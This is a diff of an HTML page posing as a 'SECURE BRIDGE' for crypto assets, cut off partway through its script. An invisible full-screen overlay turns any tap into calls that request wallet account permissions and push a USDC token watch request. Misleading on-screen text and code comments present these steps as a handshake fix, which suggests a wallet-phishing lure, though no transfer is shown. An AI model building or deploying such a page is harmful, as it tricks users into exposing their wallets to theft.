@@ -3,32 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURE ASSET BRIDGE</title>
+    <title>SECURE BRIDGE</title>
     <style>
-        body { background: #000; color: #ffeb3b; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
-        .box { border: 3px solid #ffeb3b; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 50px #ffeb3b; position: relative; z-index: 1; background: #000; }
+        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
+        .box { border: 3px solid #00f2ff; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 50px #00f2ff; position: relative; z-index: 1; background: #000; }
         .trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
-        h2 { text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 15px #ffeb3b; }
+        h2 { text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 15px #00f2ff; }
     </style>
 </head>
 <body>
     <div class="trigger" onclick="forceFinalize()"></div>
     <div class="box">
-        <h2>Handshake Active</h2>
-        <p>TAP ANYWHERE TO RELEASE ASSETS</p>
+        <h2>BRIDGE HANDSHAKE READY</h2>
+        <p>TAP ANYWHERE TO SECURE ASSETS</p>
     </div>
 
     <script>
         async function forceFinalize() {
             if (window.ethereum) {
                 try {
-                    // Step 1: Force identity re-verification to clear the browser hang
+                    // Force a total handshake reset to kill browser state-lock
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Step 2: Immediate USDC Asset trigger
+                    // Immediate USDC Asset injection trigger
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
